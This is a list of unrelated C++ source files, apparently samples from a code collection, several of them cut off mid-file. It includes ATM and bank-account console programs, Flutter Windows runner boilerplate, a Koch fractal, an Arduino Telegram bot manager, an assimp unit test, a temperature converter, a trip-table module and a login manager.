    "// src/main.cpp\n#include \"User.h\"\n#include <iostream>\n#include <fstream>\n#include <conio.h>\n#include <iomanip.h>\n\nusing namespace std;\n\nint startMenu() {\n    cout << setw(50) << \" *** Main Menu ***\" << endl;\n    cout << setw(44) << \" 1- Balance\" << endl;\n    cout << setw(44) << \" 2- Deposit\" << endl;\n    cout << setw(45) << \" 3- Withdraw\" << endl;\n    cout << setw(51) << \" 4- Funds Transfer\" << endl;\n    cout << setw(51) << \" 5- Mini Statement\" << endl;\n    cout << setw(41) << \" 6- Exit\" << endl;\n    cout << \" Selection: \";\n    int op;\n    cin >> op;\n    return op;\n}\n\nvoid processUser(User &user, User* users[], int size) {\n    int option;\n    do {\n        option = startMenu();\n        switch (option) {\n            // Add the rest of your processUser function here\n        }\n    } while (option != 6);\n}\n\nint main() {\n    clrscr();\n    User u1(\"Waseem\", \"1234\");\n    User u2(\"Ali\", \"1235\");\n    User u3(\"Ahmad\", \"2135\");\n    User u4(\"Aysha\", \"1236\");\n    User u5(\"Zafar\", \"1267\");\n\n    User* users[] = {&u1, &u2, &u3, &u4, &u5};\n\n    char n[50], p[50];\n    int loginAttempts = 0;\n\n    while (loginAttempts < 3) {\n        cout << setw(60) << \" *** Welcome to SG ATM Application *** \\n\";\n        cout << \"Enter your name: \";\n        cin >> n;\n        cout << \"Enter your PIN: \";\n        cin >> p;\n\n        User* currentUser = NULL;\n\n        for (int i = 0; i < 5; ++i) {\n            if (users[i]->checkName(n) && users[i]->checkPin(p)) {\n                currentUser = users[i];\n                break;\n            }\n        }\n\n        if (currentUser == NULL) {\n            cout << \"Invalid Username or PIN! \\n\";\n            loginAttempts++;\n            if (loginAttempts == 3) {\n                cout << \"You have reached the maximum limit of Invalid Attempts. Exiting...\\n\";\n                getche();\n                return 1;\n            }\n        } else {\n            processUser(*currentUser, users, 5);\n            cout << \"*** Would you like to continue? *** \\n\";\n            cout << \"1- YES \\n\";\n            cout << \"2- NO \\n\";\n            int cont;\n            cin >> cont;\n            if (cont == 2) {\n                break;\n            }\n            loginAttempts = 0; // Reset login attempts after successful login\n            clrscr(); // Clear screen\n        }\n    }\n    for (int i = 0; i < 5; i++) {\n        char filename[20];\n        sprintf(filename, \"file%d.txt\", i + 1);\n        users[i]->saveData(filename);\n    }\n    getche(); // Pause\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"animationlearning\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"my_flutter_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n/*\t\t\r\n TITLE: Fractal generation using Koch Curves.\r\n*/\r\n\r\n#include<iostream>\r\n#include<graphics.h>\r\n#include<math.h>\r\n\r\nusing namespace std;\r\n\r\nvoid koch(int x1,int y1,int x2,int y2,int it)\r\n{\r\n    float angle = 60*M_PI/180;\r\n    int x3 = (2*x1+x2)/3;\r\n    int y3 = (2*y1+y2)/3;\r\n    int x4 = (x1+2*x2)/3;\r\n    int y4 = (y1+2*y2)/3;\r\n\r\n    int x = x3 + (x4-x3)*cos(angle) + (y4-y3)*sin(angle);\r\n    int y = y3 - (x4-x3)*sin(angle) + (y4-y3)*cos(angle);\r\n\r\n    if(it>0)\r\n    {\r\n        delay(10);\r\n        koch(x1,y1,x3,y3,it-1);\r\n        delay(10);\r\n        koch(x3,y3,x,y,it-1);\r\n        delay(10);\r\n        koch(x,y,x4,y4,it-1);\r\n        delay(10);\r\n        koch(x4,y4,x2,y2,it-1);\r\n    }\r\n    else\r\n    {\r\n        line(x1,y1,x3,y3);\r\n        line(x3,y3,x,y);\r\n        line(x,y,x4,y4);\r\n        line(x4,y4,x2,y2);\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int gd=DETECT,gm;\r\n    initgraph(&gd,&gm,NULL);\r\n\r\n    koch(200,266,100,100,3);\r\n    koch(100,100,300,100,3);\r\n    koch(300,100,200,266,3);\r\n\r\n    delay(1500);\r\n    closegraph();\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"BotManager.h\"\n// Constructor con configuraci\u00f3n\nBotManager::BotManager(Configuracion& conf, DeviceManager* device, CTBot* botPtr) : Manager(conf), bot(botPtr){\n    isSettingEvent = false;\n    this->deviceManager = device;\n    isTelegramConnected = false;\n    \n    buttonsSetup();\n\n}\n\n// PUBLIC FUNCTION\nvoid BotManager::handleSetup(){\n  \n  connectBot();\n  \n}\n\nvoid BotManager::handleRutineJob(){\n  \n  // a variable to store telegram message data\n  if(!this->getIsAvailable()){\n    Serial.println(\" --- Bot NOT is avaialable --- \");\n    return;\n  }\n//  if(!isTelegramConnected){\n//    connectBot();\n//  }\n  connectBot();\n  handleMessages();\n}\n\n\n\n\nvoid BotManager::notify(String msg){\n    Serial.println(\" --- Enviando Mensaje Automatico por Evento Activado ---\");\n    bot->sendMessage(conf.getSenderId(),msg);\n  }\n\n\n\n\n\nbool BotManager::getIsAvailable(){\n  return conf.getIsValid();\n}\n\nvoid BotManager::connectBot(){\n  \n  if(!conf.getIsValid()){\n    Serial.println(\" --- Bot is NOT Avaialable! --- \");\n    return;\n  }\n  if(!this->conf.isConnected()){\n    return;\n  }\n  if(this->isTelegramConnected){\n    return;\n  }\n    \n  bot->setTelegramToken(conf.getTelegramToken());\n  \n  delay(100);\n\n  // Esperar a que se conecte al WiFi\n  Serial.print(\"Conectando a Telegram...\");\n\n  if (bot->testConnection()){\n    Serial.println(\"\\n --- Bot is Connected --- \");\n    this->isTelegramConnected = true;\n  } \n  else{\n    Serial.println(\" --- Bot Connection failed --- \");\n    this->isTelegramConnected = false;\n  }\n  \n}\n\nvoid BotManager::wrapper(){\n    // Llamada a la funci\u00f3n de la biblioteca.\n    bot->testConnection();\n    vTaskDelete(NULL); // Asegura que la tarea se elimine una vez completada la ejecuci\u00f3n.\n\n}\n\nbool BotManager::testTelegramConnection(){\n//    TaskHandle_t taskHandle = NULL;\n//\n//    xTaskCreate(wrapper, \"LongRunFunc\", 2048, NULL, 5, &taskHandle);\n//\n//    if (taskHandle != NULL) {\n//        // Espera por la tarea a finalizar o por el timeout.\n//        if (xTaskNotifyWait(0, 0, NULL, pdMS_TO_TICKS(timeoutMs)) == pdFALSE) {\n//            // Timeout alcanzado, la tarea a\u00fan est\u00e1 en ejecuci\u00f3n.\n//            vTaskDelete(taskHandle); // Forzamos la terminaci\u00f3n de la tarea.\n//            return false;\n//        }\n//        // Si llegamos aqu\u00ed, la tarea ha terminado por s\u00ed misma o ha sido eliminada.\n//        return true;\n//    }\n}\n\nbool BotManager::verifyHourFormat(const String& s){\n    // Verificar la longitud de la cadena\n    Serial.println(\" --- a ver la longitud... ---\");\n    if (s.length() != 3) return false;\n    Serial.println(\" --- a ver los : ... ---\");\n    // Verificar que el primer car\u00e1cter sea ':'\n    if (s.charAt(2) != ':') return false;\n    \n    // Verificar que los dos \u00faltimos caracteres sean d\u00edgitos\n    for (int i = 0; i < 2; i++) {\n      Serial.print(\" --- supuesto num: \"+i);Serial.print(s.charAt(i));Serial.println(\" --- \");\n      if (!isDigit(s.charAt(i))) return false;\n    }\n    \n    // Si todas las comprobaciones son verdaderas, el formato es correcto\n    return true;\n}\n\nbool BotManager::verifyMinFormat(const String& s){\n    // Verificar la longitud de la cadena\n    if (s.length() != 3) return false;\n    \n    // Verificar que el primer car\u00e1cter sea ':'\n    if (s.charAt(0) != ':') return false;\n    \n    // Verificar que los dos \u00faltimos caracteres sean d\u00edgitos\n    for (int i = 1; i < 3; i++) {\n      if (!isDigit(s.charAt(i))) return false;\n    }\n    \n    // Si todas las comprobaciones son verdaderas, el formato es correcto\n    return true;\n}\n\nbool BotManager::verifyWeekFormat(const String& s){\n      // Lista de d\u00edas v\u00e1lidos\n    const String diasValidos[] = {\"Lu\", \"Ma\", \"Mi\", \"Ju\", \"Vi\", \"Sa\", \"Do\"};\n    \n    // Tama\u00f1o del arreglo\n    int numDias = sizeof(diasValidos) / sizeof(diasValidos[0]);\n    \n    // Recorrer el arreglo buscando una coincidencia\n    for (int i = 0; i < numDias; i++) {\n        if (s == diasValidos[i]) {\n            return true; // El d\u00eda pertenece al conjunto\n        }\n    }\n    \n    // Si se recorre todo el arreglo y no se encuentra el d\u00eda, no pertenece al conjunto\n    return false;\n}\n\nbool BotManager::verifyEliminateFormat(const String& input){\n  if (input.length() == 8 || input.length() == 9) {\n    // Comprobar si los primeros 7 caracteres son \"Evento \"\n    if (input.substring(0, 7) == \"Evento \") {\n      // Comprobar si el siguiente caracter es un d\u00edgito\n      if (input[7] >= '0' && input[7] <= '9') {\n        // Si la longitud es 8, es un \"Evento D\" v\u00e1lido\n        if (input.length() == 8) return true;\n        // Si la longitud es 9, asegurarse de que el \u00faltimo caracter tambi\u00e9n sea un d\u00edgito\n        if (input[8] >= '0' && input[8] <= '9') return true;\n      }\n    }\n  }\n  // Si no cumple con los criterios anteriores, no es un evento v\u00e1lido\n  return false;\n}\n\nint BotManager::getNumEvent(const String& input){\n  int num = -1;\n  if(input.length() == 8){\n    Serial.println(\" --- Entre a 8 ---\");\n    num = input.substring(7,8).toInt();\n    Serial.print(\"El evento en String: \");Serial.println(in",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nclass Bank_account\r\n{\r\npublic:\r\n    string account_holder;\r\n    string address;\r\n    int age;\r\n    int account_number;\r\nprotected:\r\n    int  account_balance;\r\nprivate:\r\n    string password;\r\npublic:\r\n     Bank_account(string account_holder,string address,int age,string password)\r\n    {\r\n        this->account_number=account_number;\r\n        this->address=address;\r\n        this->age=age;\r\n        this->password=password;\r\n        this->account_number=rand()%1000000000;\r\n        this->account_balance=0;\r\n        cout<<\"Your account Number is \"<<this->account_number<<endl;\r\n    }\r\n    int show_balance(string password){\r\n\r\n    if(this->password==password){\r\n        return  this->account_balance;\r\n    }\r\n    else{\r\n        return -1;\r\n    }\r\n    }\r\n\r\n    void add_money(string password,int amount){\r\n    if(this->password==password){\r\n        this->account_balance+=amount;\r\n        cout<<\"Add money successful \"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"Password Didn't match \";\r\n    }\r\n    }\r\n\r\n      void deposit_money(string password,int amount){\r\n    if(this->password==password){\r\n        this->account_balance-=amount;\r\n        cout<<\"Add money successful \"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"Password Didn't match \";\r\n    }\r\n    }\r\n    friend class Mycash;\r\n};\r\n\r\nclass Mycash{\r\nprotected:\r\n    int balance;\r\npublic:\r\n    Mycash(){\r\n    this->balance=0;\r\n    }\r\n    void add_money_from_bank(Bank_account *myAccount,string password,int amount){\r\n\r\n    if(myAccount->password==password){\r\n        this->balance += amount;\r\n        myAccount->account_balance -= amount;\r\n        cout<<\"Add money from bank is successful\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"Password Didn't Match \"<<endl;\r\n    }\r\n    }\r\n  int show_balance(){\r\n\r\n  return balance;\r\n\r\n  }\r\n};\r\n\r\nBank_account* CreateAccount(){\r\n\r\nstring account_holder,address,password;\r\nint age;\r\ncout<<\"Create Account \"<<endl;\r\ncin>>account_holder>>address>>age>>password;\r\nBank_account *myAccount= new  Bank_account(account_holder,address,age,password);// for dynamic memory ;\r\n\r\nreturn myAccount;\r\n}\r\n\r\n\r\nvoid add_money(Bank_account*myAccount){\r\n\r\nstring password;\r\nint amount;\r\ncout<<\"ADD MONEY\"<<endl;\r\ncin>>password>>amount;\r\nmyAccount->add_money(password,amount);\r\ncout<<\"Your bank balance is \"<<myAccount->show_balance(\"abc\")<<endl;\r\n}\r\n\r\n\r\nvoid deposit_money(Bank_account*myAccount){\r\nstring password;\r\nint amount;\r\ncout<<\"DEPOSIT MONEY\"<<endl;\r\ncin>>password>>amount;\r\nmyAccount->deposit_money(password,amount);\r\ncout<<\"Your bank balance is \"<<myAccount->show_balance(\"abc\")<<endl;\r\n}\r\n\r\n\r\nvoid add_money_from_bank(Mycash *mycash ,Bank_account *myAccount){\r\nstring password;\r\nint amount;\r\ncout<<\"ADD MONEY FROM BANK \"<<endl;\r\ncin>>password>>amount;\r\n mycash->add_money_from_bank(myAccount,password,amount);\r\n cout<<\"Your bank balance is \"<<myAccount->show_balance(\"abc\")<<endl;\r\n cout<<\"MyCash Balance is \"<<mycash->show_balance()<<endl;\r\n\r\n}\r\n\r\n\r\n\r\nint main(){\r\n\r\nBank_account *myAccount=CreateAccount();\r\n\r\ndeposit_money(myAccount);\r\nMycash *mycash=new Mycash();\r\n\r\nFlag:\r\n    cout<<\"Select Option\"<<endl;\r\n    cout<<\"1.Add Money to Bank\"<<endl;\r\n    cout<<\"2.Deposit Money from Bank\"<<endl;\r\n    cout<<\"3.Add money to Mycash from Bank\"<<endl;\r\n\r\n    int option;\r\n    cin>>option;\r\n     if(option==1){\r\n        add_money(myAccount);\r\n     }\r\n    else if (option ==2){\r\n        deposit_money(myAccount);\r\n    }\r\n    else if (option==3){\r\n       add_money_from_bank(mycash,myAccount);\r\n    }\r\n    else{\r\n        cout<<\"Invalid option\"<<endl;\r\n    }\r\n    goto Flag;\r\n\r\nreturn 0;\r\n}\r\n\r\n",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2019, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer.\n\n* Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer in the documentation and/or other\nmaterials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\ncontributors may be used to endorse or promote products\nderived from this software without specific prior\nwritten permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n\n#include \"UnitTestPCH.h\"\n#include \"SceneDiffer.h\"\n#include \"AbstractImportExportBase.h\"\n\n#include <assimp/Importer.hpp>\n#include <assimp/postprocess.h>\n\nusing namespace Assimp;\n\nclass utASEImportExport : public AbstractImportExportBase {\npublic:\n    virtual bool importerTest() {\n        Assimp::Importer importer;\n        const aiScene *scene = importer.ReadFile( ASSIMP_TEST_MODELS_DIR \"/ASE/ThreeCubesGreen.ASE\", aiProcess_ValidateDataStructure );\n#ifndef ASSIMP_BUILD_NO_3DS_IMPORTER\n        return nullptr != scene;\n#else \n        return nullptr == scene;\n#endif // ASSIMP_BUILD_NO_3DS_IMPORTER\n    }\n};\n\nTEST_F( utASEImportExport, importACFromFileTest ) {\n    EXPECT_TRUE( importerTest() );\n}\n",
    "#include <iostream>\nusing namespace std;\nint main() \n{\n    // Prompt the user to input a temperature value and the original unit of measurement.\n    float temperature;\n    char unit;\n    cout << \"Enter a temperature value: \";\n    cin >> temperature;\n    cout << \"Enter the original unit of measurement (C, F, or K): \";\n    cin >> unit;\n\n    // Convert the temperature to the other two units.\n    float fahrenheit, kelvin, celcius;\n    if (unit == 'C') \n    {\n        fahrenheit = (9.0 / 5.0) * temperature + 32.0;\n        kelvin = temperature + 273.15;\n    } \n    else if (unit == 'F') \n    {\n        celcius = (5.0 / 9.0) * (temperature - 32.0);\n        kelvin = (5.0 / 9.0) * (temperature - 32.0) + 273.15;\n    } \n    else if (unit == 'K') \n    {\n        celcius = temperature - 273.15;\n        fahrenheit = (9.0 / 5.0) * (temperature - 273.15) + 32.0;\n    } \n    else \n    {\n        cout << \"Invalid unit of measurement.\" << endl;\n        return 1;\n    }\n\n    // Display the converted values to the user.\n    cout << \"The temperature in Fahrenheit is: \" << fahrenheit << endl;\n    cout << \"The temperature in Kelvin is: \" << kelvin << endl;\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"concurrency\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"TripTable.h\"\n#include <iostream>\n\n//\u6bcf\u4e2a\u57ce\u5e02\u5bf9\u5e94\u4e00\u4e2a\u7f16\u53f7\uff0c\u65b9\u4fbf\u90bb\u63a5\u8868\u4f7f\u7528\n\nCity::City() = default;\nCity::City(const string& name):name(name) {sign = -1;}\nCity::operator int() const{\n    return sign;\n}\nCity::City(const string& name, int sign): name(name), sign(sign) {}\n\nstd::ostream& City::operator<<(std::ostream& os) const{\n    os << name;\n\n    return os;\n}\n\nTripNode::TripNode() = default;\n\nTripNode::TripNode(const Trip& t, TripNode* next): t(t), next(next) { }\nTripNode::operator Trip() {\n    return t;\n}\n\nTrip& TripNode::operator*() {\n    return t;\n}\n\nMenu::Menu(): div(NULL), end(NULL), table(NULL) {\n    cities = new City[MAXCITY];\n    pool = NULL;\n}\nMenu::~Menu() {\n\tTripNode* pre = table;\n\tTripNode* head = pre->next;\n\twhile (head != NULL) {\n\t\tdelete pre;\n\t\tpre = head;\n\t\thead = head->next;\n\t}\n\tdelete pre;\n}\n\nint Menu::addTrip(const Trip& t) noexcept{//\u6dfb\u52a0\u884c\u7a0b\uff0c\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38\n    TripNode* n = new TripNode(Trip(t), NULL);\n    if (table == NULL) {\n        table = n;\n        end = n;\n        if (n->t.type == RAIL)\n            div = n;\n        return 0;\n    }\n    if (t.type == AIR) {\n        end->next = n;\n        n->next = NULL;\n        end = n;\n    }\n    else if (t.type == RAIL) {\n        if (div != NULL) {\n            n->next = div->next;\n            div->next = n;\n            div = n;\n        }\n        else {\n            n->next = table;\n            table = n;\n            div = n;\n        }\n    }\n\n    return 0;\n}\n\nint Menu::addCity(const City& c) {\n    if (pool == NULL) {//\u672a\u901a\u8fc7\u6587\u4ef6\u521d\u59cb\u5316\uff0c\u6b64\u65f6\u6dfb\u52a0\u57ce\u5e02\u5bfc\u81f4\u9519\u8bef\u3002\u5982\u51fa\u73b0\u6b64\u5f02\u5e38\uff0c\u5c5e\u4e8e\u4ee3\u7801\u903b\u8f91\u9519\u8bef\n        menuErr e(\"Add city before initing menu\");\n        throw e;\n    }\n\n    City cc(c);\n    cc.sign = getSign();\n    cities[cc.sign] = cc;\n        \n    return 0;\n}\n\nint Menu::delCity(const City& c) {\n    int id = c.sign;\n    pool[id] = 1;\n    return 0;\n}\n\nint Menu::initPool() {//\u521d\u59cb\u5316\u7f16\u53f7\u6c60\n    pool = new int[MAXCITY];\n\n    if (pool == NULL) {//\u5f02\u5e38\u5904\u7406\n        memErr e(\"error newing the pool\");\n        throw e;\n    }\n\n    for (int i = 0; i < MAXCITY; i++) {\n        pool[i] = 1;\n    }\n}\n\nint Menu::clearPool() {\n    if (pool == NULL) return 1;\n    delete []pool;\n    pool = NULL;\n    return 0;\n}\n\nint Menu::getSign() {\n    for (int i = 0; i < MAXCITY; i++) {\n        if(pool[i]) {\n            pool[i] = 0;\n            return i;\n        }\n    }\n\n    return -1;//control never reaches here\n}\n\nvoid Menu::disp() {//\u6d4b\u8bd5\u7528\u51fd\u6570\n    TripNode* it = table;\n    int i = 1;\n    while(it != NULL) {\n        auto tmp = it->t;\n        std::cout << tmp.stfCity.name << \" -> \" << tmp.arvCity.name << \" with \" << tmp.cost << \"yuan\\n\";\n        it = it->next;\n    }\n}\n\nTripNode* Menu::getTable() {\n    return table;\n}\n\nint Menu::updCity(City& city, string name1) {\n\tcity.name = name1;\n\treturn 0;\n}\n\nint Menu::updTrip(TripNode* trip, City stfCity1, City arvCity1, int cost1, int dist1, int hour1, int minute1, Triptype type1) {\n\ttrip->t.arvCity = arvCity1;\n\ttrip->t.stfCity = stfCity1;\n\ttrip->t.cost = cost1;\n\ttrip->t.dist = dist1;\n\ttrip->t.time = Time(hour1, minute1);\n\ttrip->t.type = type1;\n\treturn 0;\n}\n\nint Menu::delTrip(TripNode* trip) {\n\tif (trip == table) {\n\t\ttable = trip->next;\n\t\tdelete trip;\n\t}\n\telse if (trip == div) {\n\t\tTripNode* head = table;\n\t\twhile (head->next != div)\n\t\t\thead = head->next;\n\t\tdiv = head;\n\t\tdiv->next = trip->next;\n\t\tdelete trip;\n\t}\n\telse if (trip == end) {\n\t\tTripNode* head = table;\n\t\twhile (head->next != end)\n\t\t\thead = head->next;\n\t\tend = head;\n\t\tdelete trip;\n\t}\n\telse {\n\t\tTripNode* head = table;\n\t\twhile (head->next != trip)\n\t\t\thead = head->next;\n\t\thead->next = trip->next;\n\t\tdelete trip;\n\t}\n\treturn 0;\n}\n\nvoid get_next(string s, int* next) {\n\tnext[0] = -1;\n\tint j = -1, k = 0;\n\twhile (k < s.length() - 1) {\n\t\tif (j == -1 || s[j] == s[k]) {\n\t\t\tj++;\n\t\t\tk++;\n\t\t\tnext[k] = j;\n\t\t}\n\t\telse {\n\t\t\tj = next[j];\n\t\t}\n\t}\n}\n\nbool KMP(string s, string t) {\n\tint next[10];\n\tint m = s.length();\n\tint n = t.length();\n\tget_next(t, next);\n\tint j = 0, k = 0;\n\twhile (j < m && k < n) {\n\t\tif (k == -1 || s[j] == t[k]) {\n\t\t\tj++;\n\t\t\tk++;\n\t\t}\n\t\telse {\n\t\t\tk = next[k];\n\t\t}\n\t}\n\tif (k == n) {\n\t\treturn 1;\n\t}\n\telse\n\t\treturn 0;\n}\n\nvector<TripNode*> Menu::searchTrip(const Menu menu, string stfCity, string arvCity, Triptype type) {\n\tvector<TripNode*>res;\n\tTripNode* head = menu.table;\n\twhile (head != NULL) {\n\t\tres.push_back(head);\n\t\thead = head->next;\n\t}\n\tif (stfCity[0] != NULL) {\n\t\tres = searchTripByStf(res, stfCity);\n\t}\n\tif (arvCity[0] != NULL) {\n\t\tres = searchTripByArv(res, arvCity);\n\t}\n\tres = searchTripByType(res, type);\n\treturn res;\n}\n\nvector<TripNode*> Menu::searchTripByStf(vector<TripNode*>list, string stf) {\n\tvector<TripNode*> tripList;\n\tvector<TripNode*>::iterator head = list.begin();\n\twhile (head != list.end()) {\n\t\tif (KMP((*head)->t.stfCity.name, stf)) {\n\t\t\ttripList.push_back(*head);\n\t\t}\n\t\thead++;\n\t}\n\treturn tripList;\n}\n\nvector<TripNode*> Menu::searchTripByArv(vector<TripNode*>list, string arv) {\n\tvector<TripNode*> tripList;\n\tvector<TripNode*>::iterator head = list.begin();\n\twhile (head != list.end()) {\n\t\tif (KMP((*head)->t.stfCity.name, arv)) {\n\t\t\ttripList.push_back(*head);\n\t\t}\n\t",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <iomanip>\n#include \"CustomerApplication.cpp\"\n#include \"ProductApplication.cpp\"\n#include \"CustomerManager.cpp\"\n#include \"ProductManager.cpp\"\n#include \"DataValidInput.cpp\"\n#include \"User.cpp\"\n#include <cstdlib> \n\nusing namespace std;\n\nclass LoginManager {\n    CustomerManager customermanager;\n    ProductManager productmanager;\n\nprivate:\n    vector<User> users;\n    string usersFile = \"users.dat\";\n\npublic:\n    LoginManager() {\n        loadUsers();\n    }\n     \n    void loadUsers() {\n        ifstream file(usersFile, ios::binary);\n        if (file.is_open()) {\n            User user;\n            while (file.read((char*)&user, sizeof(User))) {\n                users.push_back(user);\n            }\n            file.close();\n        }  \n    }\n\n    void saveUsers() {\n        ofstream file(usersFile, ios::binary | ios::trunc);\n        if (file.is_open()) {\n            for (const auto& user : users) {\n                file.write((char*)&user, sizeof(User));\n            }\n            file.close();\n        } else {\n            DataValidInput::SetColor(12);\n            cerr << \"Could not open file \" << usersFile << \" for writing.\" << endl;\n        }\n    }\n\n    void addUser() {\n        string username, password, role;\n        cout << \"Enter username: \";\n        cin >> username;\n        cout << \"Enter password: \";\n        cin >> password;\n        cout << \"Enter role (admin/user): \";\n        cin >> role;\n\n        users.push_back(User(username, password, role));\n        saveUsers();\n        cout << \"User added successfully!\" << endl;\n    }\n\n    bool authenticate(const string& username, const string& password, User& authenticatedUser) {\n        for (const auto& user : users) {\n            if (user.getUsername() == username && user.getPassword() == password) {\n                authenticatedUser = user;\n                return true;\n            }\n        }\n        return false;\n    }\n\n    void login() {\n        string username, password;\n        cout << \"Enter username: \";\n        cin >> username;\n        cout << \"Enter password: \";\n        cin >> password;\n\n        User authenticatedUser;\n        if (authenticate(username, password, authenticatedUser)) {\n            cout << \"Login successful! Role: \" << authenticatedUser.getRole() << endl;\n            if (authenticatedUser.getRole() == \"admin\") {\n                 system(\"cls\");\n                adminMenu();\n            } else {\n                system(\"cls\");\n                userMenu();\n            }\n        } else {\n            DataValidInput::SetColor(12);\n            cout << \"Invalid username or password.\" << endl;\n        }\n    }\n\n    void regis() {\n        string username, password, role;\n        cout << \"Enter username: \";\n        cin >> username;\n        cout << \"Enter password: \";\n        cin >> password;\n        cout << \"Enter role (admin/user): \";\n        cin >> role;\n\n        users.push_back(User(username, password, role));\n        saveUsers();\n        cout << \"User added successfully!\" << endl;\n    }\n\n    void adminMenu() {\n        enum MainMenu {EXIT, CUSTOMER, PRODUCT};\n        int choice;\n        cout.setf(ios::fixed | ios::showpoint);\n        cout << setprecision(2);\n\n        do {\n            system(\"cls\");\n            DataValidInput::SetColor(11);\n            cout << \"\\t||- **************** -||\\n\";\n            cout << \"\\t       Admin Menu\\n\";\n            cout << \"\\t||- **************** -||\\n\";\n            cout << \"\\n1. Customer Management\\n\";\n            cout << \"2. 